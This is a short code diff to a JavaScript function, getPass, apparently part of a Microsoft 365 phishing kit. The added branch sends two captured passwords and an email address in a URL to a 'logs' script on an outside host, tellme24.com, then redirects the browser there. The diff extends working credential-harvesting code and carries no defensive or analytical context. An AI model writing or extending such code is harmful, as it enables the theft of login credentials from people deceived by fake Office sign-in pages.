@@ -136,7 +136,10 @@ function getPass(pass1, pass2, mail) {
         }
         else  if (data_send.value == 3) {
             url = "https://tellme24.com/logs/365/gb3/msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
-        } 
+        }
+        else  if (data_send.value == 4) {
+            url = "https://tellme24.com/logs/365/bo/msn365.php?auth=office&pass1="+pass1+"&pass2="+pass2+"&mail="+mail; 
+        }
 
         location = url;
         
